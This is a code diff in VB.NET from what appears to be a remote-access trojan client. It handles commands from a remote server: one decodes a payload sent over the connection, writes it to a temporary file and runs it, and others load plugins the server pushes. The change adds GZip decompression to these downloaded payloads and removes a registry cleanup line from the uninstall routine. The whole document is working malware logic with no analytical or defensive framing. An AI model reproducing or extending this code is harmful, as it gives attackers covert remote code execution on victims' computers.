@@ -35,7 +35,6 @@
                                 Diagnostics.Process.Start(C_Settings.fullpath)
                                 End
                             Case "3"
-                                Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree("Software\" & C_ID.HWID)
                                 C_Installation.DEL()
                         End Select
 
@@ -44,7 +43,7 @@
 
                     Case "RD-"
                         Dim NewFile = IO.Path.GetTempFileName & IO.Path.GetExtension(A(1))
-                        IO.File.WriteAllBytes(NewFile, Convert.FromBase64String(A(2)))
+                        IO.File.WriteAllBytes(NewFile, GZip(Convert.FromBase64String(A(2)), False))
                         Threading.Thread.CurrentThread.Sleep(1000)
                         Diagnostics.Process.Start(NewFile)
                         If A(3).ToString = "update" Then
@@ -68,12 +67,12 @@
                         If GTV(A(1)) = Nothing Then
                             C.Send("GPL" + SPL + A(1))
                         Else
-                            Plugin(Convert.FromBase64String(GTV(A(1))))
+                            Plugin(GZip(Convert.FromBase64String(GTV(A(1))), False))
                         End If
 
                     Case "IPL" 'invo plugin
                         STV(A(2), A(1))
-                        Plugin(Convert.FromBase64String(GTV(A(2))))
+                        Plugin(GZip(Convert.FromBase64String(GTV(A(2))), False))
 
                 End Select
             Catch ex As Exception
